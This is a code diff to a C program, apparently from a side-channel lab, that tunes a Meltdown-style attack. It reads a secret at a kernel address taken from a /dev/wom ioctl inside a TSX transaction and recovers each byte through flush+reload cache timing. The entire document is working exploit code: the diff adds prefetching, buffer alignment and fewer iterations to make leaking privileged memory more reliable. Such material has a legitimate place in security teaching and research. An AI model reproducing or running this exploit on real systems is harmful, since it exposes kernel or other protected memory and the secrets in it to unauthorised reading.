@@ -15,6 +15,7 @@
 #include <x86intrin.h>
 #include <time.h>
 #include <assert.h>
+#include <xmmintrin.h>
 
 #include "asm.h"
 
@@ -70,56 +71,78 @@ int main() {
     int fd = open("/dev/wom", O_RDONLY);
     if (fd < 0) { perror("open"); return 1; }
 
-    unsigned long secret_addr = 0;
+    unsigned long long secret_addr = 0;
     if (ioctl(fd, WOM_GET_ADDRESS, &secret_addr) < 0) { perror("ioctl"); return 1; }
+    printf("Secret address: 0x%llx\n", secret_addr);
 
     int RELOADBUFFER_SIZE = 256 * STRIDE;
-    unsigned char *reloadbuffer = (unsigned char*)malloc(RELOADBUFFER_SIZE);
+    uint8_t *reloadbuffer;
+    if (posix_memalign((void**)&reloadbuffer, 4096, RELOADBUFFER_SIZE) != 0) {
+        perror("posix_memalign failed");
+        exit(1);
+    }
     assert(reloadbuffer);
-    for (int i = 0; i < 256; i++) reloadbuffer[i * STRIDE] = 1;
+    for (int i = 0; i < 256; i++) {
+        reloadbuffer[i * STRIDE] = 0xFF;
+    }
 
     lfence(); cpuid();
     int CACHE_THRESHOLD = calibrate_threshold(reloadbuffer + 128 * STRIDE);
 
-    char warm[SECRET_LENGTH];
-    lseek(fd, 0, SEEK_SET);
-    ssize_t r = read(fd, warm, SECRET_LENGTH);
-    (void)r;
-
     unsigned char leaked[SECRET_LENGTH] = {0};
-    int ITERATIONS = 300;
+    int ITERATIONS = 40;
 
     for (int offset = 0; offset < SECRET_LENGTH; ++offset) {
         int counts[256] = {0};
 
         for (int it = 0; it < ITERATIONS; it++) {
-            for (int i = 0; i < 256; i++) clflush(reloadbuffer + i * STRIDE);
+            for (int i = 0; i < 256; i++) {
+                clflush(reloadbuffer + i * STRIDE);
+            }
             lfence(); cpuid();
 
+            char warm[SECRET_LENGTH];
+            lseek(fd, 0, SEEK_SET);
+            ssize_t r = read(fd, warm, SECRET_LENGTH);
+            (void)r;
+            //lfence(); cpuid();
+
+            _mm_prefetch((const char *)secret_addr + offset, _MM_HINT_T0);
+            _mm_prefetch((const char *)secret_addr + offset, _MM_HINT_T0);
+            lfence();
+            cpuid();
+
+            volatile uint8_t dummy;
             unsigned st = _xbegin();
             if (st == _XBEGIN_STARTED) {
-                unsigned char v = *(volatile unsigned char*)(secret_addr + offset);
-                sink = *(volatile unsigned char*)(reloadbuffer + ((unsigned)v) << 12);
+                uint8_t v = *(volatile uint8_t*)(secret_addr + offset);
+                dummy = reloadbuffer[v * STRIDE];
                 _xend();
             }
+            lfence();
+            cpuid();
 
             for (int i = 0; i < 256; i++) {
                 uint64_t k = (i + 109883 * 256) & 255;
-                lfence(); cpuid();
-                uint64_t dt = time_access(reloadbuffer + k * STRIDE);
-                if ((int)dt < CACHE_THRESHOLD) counts[k]++;
+                k = (k + 3578962147 * 4096) & 255;
+                volatile uint8_t *p = (volatile uint8_t *)(reloadbuffer + (k * STRIDE));
+                uint64_t dt = time_access(p);
+                if ((int)dt < CACHE_THRESHOLD) {
+                    counts[k]++;
+                }
             }
         }
 
         int best = 0, bestc = -1;
-        for (int v = 0; v < 256; v++) if (counts[v] > bestc) { bestc = counts[v]; best = v; }
+        for (int v = 0; v < 256; v++) {
+            if (counts[v] > bestc) {
+                bestc = counts[v]; best = v;
+            }
+        }
         leaked[offset] = (unsigned char)best;
     }
 
-    printf("Secret: ");
-    for (int i = 0; i < SECRET_LENGTH; i++) printf("%02x", leaked[i]);
-    printf("\n");
-
+    printf("Secret: %s\n", leaked);
     free(reloadbuffer);
     close(fd);
     return 0;
